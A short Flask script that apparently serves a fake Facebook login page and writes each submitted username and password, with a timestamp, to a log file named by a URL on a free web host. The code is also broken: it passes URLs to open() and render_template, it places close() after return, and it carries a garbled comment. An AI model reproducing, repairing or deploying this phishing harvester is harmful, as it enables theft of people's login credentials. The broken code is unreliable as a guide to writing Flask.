from flask import Flask, render_template, request
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db_ent = open("https://helppopol.000webhostapp.com/log.txt", 'a')    
        db_ent.write("\n \n" + username + " : " + password + "     [*] {}".format(datetime.datetime.now().strftime("%A %b %Y and Time was  : %I:%M:%S")))   
        return render_template('https://helppopol.000webhostapp.com/facebook.php')
        db_ent.close()
    return render_template('https://helppopol.000webhostapp.com/facebook.php')

# can not be called and execute arbitrary
if __name__ == '__main__':
    app.run(host='145.14.145.88', port=80)
